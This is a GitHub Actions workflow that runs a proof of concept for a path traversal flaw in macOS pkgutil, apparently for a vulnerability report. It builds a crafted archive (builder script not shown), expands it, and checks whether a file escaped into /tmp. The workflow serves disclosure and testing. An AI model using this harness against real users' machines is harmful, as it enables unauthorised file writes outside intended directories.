name: pkgutil Path Traversal PoC OE1104428478322

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  run-poc:
    strategy:
      fail-fast: false
      matrix:
        include:
          - runner: macos-latest
            label: macos-26
          - runner: xcode-27
            label: macos-27

    runs-on: ${{ matrix.runner }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build poc.xar
        run: python3 build_poc_xar.py

      - name: Inspect poc.xar
        run: python3 inspect_poc.py poc.xar

      - name: Run PoC — pkgutil --expand path traversal
        run: |
          mkdir -p results
          LOG=results/poc_terminal_log_${{ matrix.label }}.txt
          log() { echo "$@" | tee -a "$LOG"; }

          log "======================================"
          log "  pkgutil Path Traversal PoC"
          log "  Report: OE1104428478322"
          log "  Runner label: ${{ matrix.label }}"
          log "======================================"
          log ""
          log "=== System ==="
          sw_vers 2>&1 | tee -a "$LOG"
          uname -m 2>&1 | tee -a "$LOG"
          log ""
          log "=== pkgutil location ==="
          which pkgutil 2>&1 | tee -a "$LOG"
          file "$(which pkgutil)" 2>&1 | tee -a "$LOG"
          log ""
          log "=== poc.xar embedded filename ==="
          python3 inspect_poc.py poc.xar 2>&1 | tee -a "$LOG"
          log ""
          log "=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ==="
          SAFE_DIR=/tmp/safe_expand_dir
          ESCAPED=/tmp/pwned_pkgutil
          rm -rf "$SAFE_DIR" "$ESCAPED"
          pkgutil --expand poc.xar "$SAFE_DIR" 2>&1 | tee -a "$LOG"
          PKGUTIL_EXIT=${PIPESTATUS[0]}
          log "pkgutil exit code: $PKGUTIL_EXIT"
          log ""
          log "=== Contents inside safe_expand_dir (recursive) ==="
          find "$SAFE_DIR" 2>/dev/null >> "$LOG" || log "(safe_expand_dir not found)"
          log ""
          log "=== Broader /tmp scan for unexpected writes ==="
          find /tmp -maxdepth 4 2>/dev/null | sort >> "$LOG"
          log ""
          log "=== Out-of-bounds check: /tmp/pwned_pkgutil ==="
          if [ -e "$ESCAPED" ]; then
            log "RESULT: VULNERABLE"
            log "File written OUTSIDE expansion directory:"
            ls -la "$ESCAPED" 2>&1 | tee -a "$LOG"
            log "Contents: $(cat "$ESCAPED")"
          else
            log "RESULT: /tmp/pwned_pkgutil NOT created"
            log ""
            log "=== Any file containing 'pwned' anywhere in /tmp ==="
            find /tmp -name '*pwned*' 2>/dev/null >> "$LOG" || log "(none)"
            log ""
            log "=== Any file containing traversal payload ==="
            grep -rl 'pwned via pkgutil' /tmp 2>/dev/null >> "$LOG" || log "(none)"
          fi
          log ""
          log "=== END OF LOG ==="
          echo ""
          echo "--- Full log follows ---"
          cat "$LOG"

      - name: Collect and commit results
        if: always()
        run: |
          git config user.email "poc-bot@github-actions"
          git config user.name "GitHub Actions"
          git add results/
          MSG="results(${{ matrix.label }}): poc run $(date -u +%Y-%m-%dT%H:%M:%SZ)"$'\n\n'"Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>"$'\n'"Claude-Session: https://claude.ai/code/session_016osine6GRgdkb8UHqaRAGM"
          git commit -m "$MSG" || echo "nothing to commit"
          git push origin main

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-results-${{ matrix.label }}-${{ github.run_id }}
          path: |
            poc.xar
            build_poc_xar.py
            inspect_poc.py
            results/
          retention-days: 90
